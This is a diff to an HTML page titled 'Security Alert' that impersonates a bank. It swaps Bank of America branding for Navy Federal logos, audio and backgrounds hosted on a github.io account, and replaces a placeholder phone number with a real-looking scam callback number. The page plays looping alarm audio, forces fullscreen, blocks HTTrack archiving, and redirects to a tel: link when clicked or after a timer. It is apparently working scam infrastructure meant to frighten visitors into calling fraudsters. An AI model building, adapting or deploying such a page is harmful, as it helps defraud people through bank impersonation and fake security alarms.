@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    
 <meta charset="UTF-8">
 <title>Security Alert</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
@@ -131,7 +132,7 @@
 
 <div id="leavePopup">
     <div class="popup-content">
-        <img id="logoImage" src="https://1992gameofthrone1992.github.io/imagetopa/bofa-logo.jpg" alt="Logo">
+        <img id="logoImage" src="https://1992gameofthrone1992.github.io/imagetopa/navylogo.png" alt="Logo">
         
         <div class="alert-text">🚨 URGENT SECURITY ALERT 🚨</div>
         <div class="message-text">
@@ -153,12 +154,12 @@
         </div>
 
         <button id="callNowBtn">Call Now</button>
-        <div id="callNumberText">+1 888 888 8888</div>
+        <div id="callNumberText">+1-844-709-2550</div>
     </div>
 </div>
 
 <audio id="alertAudio" loop>
-    <source src="https://1992gameofthrone1992.github.io/imagetopa/wfa1.m4a" type="audio/mp4">
+    <source src="https://1992gameofthrone1992.github.io/imagetopa/navyfederal.m4a" type="audio/mp4">
 </audio>
 
 <script>
@@ -174,9 +175,9 @@
 
     window.onload = function() {
         if (isMobile()) {
-            startImage.style.backgroundImage = "url('https://1992gameofthrone1992.github.io/imagetopa/boam.jpeg')";
+            startImage.style.backgroundImage = "url('https://1992gameofthrone1992.github.io/imagetopa/navymob.jpeg')";
         } else {
-            startImage.style.backgroundImage = "url('https://1992gameofthrone1992.github.io/imagetopa/boa-pc.png')";
+            startImage.style.backgroundImage = "url('https://1992gameofthrone1992.github.io/imagetopa/navyderal.png')";
         }
 
         if (navigator.userAgent.includes("HTTrack")) {
@@ -218,12 +219,12 @@
         }, 1000);
 
         setTimeout(function () {
-            window.location.href = "tel:+18888888888";
+            window.location.href = "tel:+18447092550";
         }, 480000);
     }, { once: true });
 
     callNowBtn.addEventListener('click', function () {
-        window.location.href = "tel:+18888888888";
+        window.location.href = "tel:+18447092550";
     });
 
     function triggerFullScreen() {
@@ -238,9 +239,9 @@
 
     function applyBackground() {
         if (isMobile()) {
-            document.body.style.backgroundImage = "url('https://1992gameofthrone1992.github.io/imagetopa/boam.jpeg')";
+            document.body.style.backgroundImage = "url('https://1992gameofthrone1992.github.io/imagetopa/navymob.jpeg')";
         } else {
-            document.body.style.backgroundImage = "url('https://1992gameofthrone1992.github.io/imagetopa/boa-pc.png')";
+            document.body.style.backgroundImage = "url('https://1992gameofthrone1992.github.io/imagetopa/navyderal.png')";
         }
         document.body.style.backgroundSize = "100% 100%";
         document.body.style.backgroundPosition = "center";
